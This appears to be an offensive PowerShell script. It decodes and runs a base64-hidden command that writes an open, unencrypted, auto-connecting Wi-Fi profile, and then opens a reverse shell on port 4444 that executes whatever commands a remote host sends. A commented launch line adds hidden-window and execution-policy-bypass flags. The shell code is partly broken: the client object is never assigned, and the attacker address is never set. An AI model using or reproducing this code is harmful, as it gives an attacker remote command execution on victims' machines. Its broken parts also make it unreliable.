# Base64 encoded command
$encodedCommand = "ZWNobyAnPD94bWwgdmVyc2lvbj0iMS4wIj8+PFdMQU5Qcm9maWxlIHhtbG5zPSJodHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20vbmV0d29ya2luZy9XTEFOL3Byb2ZpbGUvdjEiPjxuYW1lPkJsYWNrPC9uYW1lPjxTU0lEQ29uZmlnPjxTU0lEPjxoZXg+NDI2QzYxNjM2QjwvaGV4PjxuYW1lPkJsYWNrPC9uYW1lPjwvU1NJRD48L1NTSURDb25maWc+PGNvbm5lY3Rpb25UeXBlPkVTUzwvY29ubmVjdGlvblR5cGU+PGNvbm5lY3Rpb25Nb2RlPmF1dG88L2Nvbm5lY3Rpb25Nb2RlPjxNU00+PHNlY3VyaXR5PjxhdXRoRW5jcnlwdGlvbj48YXV0aGVudGljYXRpb24+b3BlbjwvYXV0aGVudGljYXRpb24+PGVuY3J5cHRpb24+bm9uZTwvZW5jcnlwdGlvbj48dXNlT25lWD5mYWxzZTwvdXNlT25lWD48L2F1dGhFbmNyeXB0aW9uPjwvc2VjdXJpdHk+PC9NU00+PE1hY1JhbmRvbWl6YXRpb24geG1sbnM9Imh0dHA6Ly93d3cubWljcm9zb2Z0LmNvbS9uZXR3b3JraW5nL1dMQU4vcHJvZmlsZS92MyI+PGVuYWJsZVJhbmRvbWl6YXRpb24+ZmFsc2U8L2VuYWJsZVJhbmRvbWl6YXRpb24+PC9NYWNSYW5kb21pemF0aW9uPjwvV0xBTlByb2ZpbGU+JyA+IEM6XEJsYWNrLnhtbAo=";


# Decode the Base64 string
$decodedCommandBytes = [System.Convert]::FromBase64String($encodedCommand)
$decodedCommand = [System.Text.Encoding]::UTF8.GetString($decodedCommandBytes)

# Execute the decoded command
Invoke-Expression $decodedCommand


#powershell -NoP -NonI -W Hidden -Exec Bypass -Command 
$port = 4444;

# reverse shell and try to connect to wifi in a loop
New-Object System.Net.Sockets.TCPClient($ip_addr,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
